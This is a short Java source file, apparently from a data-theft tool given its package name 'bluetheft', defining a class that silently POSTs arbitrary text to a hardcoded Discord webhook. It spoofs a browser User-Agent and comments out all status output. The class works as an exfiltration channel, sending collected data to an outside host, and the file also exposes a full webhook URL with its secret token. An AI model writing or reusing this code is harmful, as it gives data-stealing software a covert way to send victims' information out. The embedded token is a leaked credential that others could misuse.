package com.bluetheft;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class DiscordWebhook {

    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1325202643064324156/GcwtGPESMMBPHvDi4a02if7mXcgoLVOmDhl9p5Xe6HPAgaVO85AB5Utkd7VrTenC7Qja";

    public static void sendMessage(String message) {
        try {
         //   System.out.println("Connexion au webhook...");
            URL url = new URL(WEBHOOK_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0"); // Ajout du User-Agent
            connection.setDoOutput(true);

             //Créer le corps JSON avec gestion des accents
            String sanitizedMessage = message.replace("\n", "\\n").replace("\"", "\\\"");
            String jsonPayload = "{\"content\": \"" + sanitizedMessage + "\"}";
           // System.out.println("Payload envoyé : " + jsonPayload);

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
           // System.out.println("Code de réponse : " + responseCode);
            if (responseCode == 204) { // Succès
            //    System.out.println("Message envoyé avec succès !");
            } else {
             //   System.out.println("Échec de l'envoi, code : " + responseCode);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}